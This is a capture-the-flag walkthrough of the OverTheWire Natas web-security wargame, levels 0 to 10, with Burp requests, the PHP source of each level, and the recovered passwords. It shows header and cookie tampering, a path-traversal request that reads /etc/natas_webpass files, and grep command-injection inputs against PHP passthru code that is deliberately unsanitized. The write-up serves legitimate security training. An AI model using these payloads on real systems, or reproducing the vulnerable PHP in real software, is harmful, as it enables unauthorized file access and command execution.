---
description: This is a collection of challenges built around common web application vulnerabilities
---

# Natas

## Level 0

To start off we follow the instructions found here [https://overthewire.org/wargames/natas/natas0.html](https://overthewire.org/wargames/natas/natas0.html) and log into the first challenge at http://natas0.natas.labs.overthewire.org

This challenge is quite simple and the source code contains the password (CTRL+U in firefox).

{% tabs %}
{% tab title="Flag" %}
```
gtVrDuiDfck831PqWsLEZy5gyDz1clto
```
{% endtab %}
{% endtabs %}

## Level 1

This challenge works exactly the same, but right clicking is blocked. This isn't a problem though since we're using a keyboard shortcut.
{% tabs %}
{% tab title="Flag" %}
```
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
```
{% endtab %}
{% endtabs %}

## Level 2

When looking at the source code we see a file being references at `files/pixel.png`, navigating to `/files` shows us that there is a file called `users.txt` which contains the flag.

{% tabs %}
{% tab title="Flag" %}
```
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```
{% endtab %}
{% endtabs %}

## Level 3

There is a comment in the source code with the reference "Not even Google will find this" which implies a `robot.txt` file is involved here. checking that file shows us a directory `/s3cr3t` which contains a `users.txt` file that contains the flag.

{% tabs %}
{% tab title="Flag" %}
```
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```
{% endtab %}
{% endtabs %}
## Level 4

This page tells us that valid users only come from `http://natas5.natas.labs.overthewire.org/`, so we use the following burp request and manually set the `Referer` value to that endpoint.

{% tabs %}
{% tab title="Burp Request" %}
```HTTP
GET / HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Referer: http://natas5.natas.labs.overthewire.org/
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
{% endtab %}
{% tab title="Flag" %}
```
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```
{% endtab %}
{% endtabs %}
## Level 5

This challenge simply tells us that we aren't logged in. Running the request through burp we see that there is a cookie called `loggedin` that is set to 0 by default. We modify the request and set the value to 1 as shown below.

{% tabs %}
{% tab title="Burp Request" %}
```HTTP
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
Connection: close
Cookie: loggedin=1
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
{% endtab %}
{% tab title="Flag" %}
```
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```
{% endtab %}
{% endtabs %}
## Level 6

This challenge presents us with a form to submit a secret with, and also provides a link to view the source code of the function. In the source code we see it is including a `includes/secret.inc`. when navigating to that page and viewing the source we are given the secret to submit. After submitting the secret we get the flag. 

{% tabs %}
{% tab title="Secret" %}
```
FOEIUWGHFEEUHOFUOIU
```
{% endtab %}
{% tab title="Flag" %}
```
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```
{% endtab %}
{% endtabs %}
## Level 7

On this challenge we see two href's using `index.php?page=<page>` which screams LFI on basic challenges like this. Using the following burp request we can read the file `/etc/natas_webpass/natas8`. 

{% tabs %}
{% tab title="Burp Request" %}
```HTTP
GET /index.php?page=../../../../../etc/natas_webpass/natas8 HTTP/1.1
Host: natas7.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas7.natas.labs.overthewire.org/
Authorization: Basic bmF0YXM3Ojd6M2hFRU5qUXRmbHpnblQyOXE3d0F2TU5mWmRoMGk5
Connection: close
Upgrade-Insecure-Requests: 1
```
{% endtab %}
{% tab title="Flag" %}
```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```
{% endtab %}
{% endtabs %}
## Level 8

We are given another secret submission form as well as the source code. This time they are using a custom encoding function and checking it against a pre-encoded string. The secret validation code is shown below, as well as my decoding script. Running this gives us the secret.

{% tabs %}
{% tab title="Secret Submission" %}
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
{% endtab %}
{% tab title="decoder.py" %}
```python
import base64

def natasDecode(secret):
    # first we convert from hex -> string
    secret = bytearray.fromhex(secret).decode()
    # then we reverse the string
    secret = secret[::-1]
    # then we base64 decode the string
    secret = base64.b64decode(secret)
    # then we convert from bytearray to str for printing
    return secret.decode("utf-8")


plaintext = natasDecode('3d3d516343746d4d6d6c315669563362')
print(plaintext)
```
{% endtab %}
{% tab title="Secret" %}
```
oubWYf2kBq
```
{% endtab %}
{% tab title="Flag" %}
```
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```
{% endtab %}
{% endtabs %}
## Level 9

In this challenge we are given a form that is then used to run `grep` via php. But it is not sanitizing input, so we can manipulate the command to read the flag file instead. The original php as well as the input needed to obtain the flag are shown below:

{% tabs %}
{% tab title="PHP Grep" %}
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
{% endtab %}
{% tab title="Form Input" %}
```
-e ".*" /etc/natas_webpass/natas10;
```
{% endtab %}
{% tab title="Flag" %}
```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```
{% endtab %}
{% endtabs %}

## Level 10

This challenge runs the same grep command with php, but it filters the user's input first. Our solution will still work though by removing the `;` from our input. This will just have grep search our file as well as the one defined in the php file.

{% tabs %}
{% tab title="PHP Grep" %}
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
{% endtab %}
{% tab title="Form Input" %}
```
-e ".*" /etc/natas_webpass/natas11
```
{% endtab %}
{% tab title="Flag" %}
```
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```
{% endtab %}
{% endtabs %}
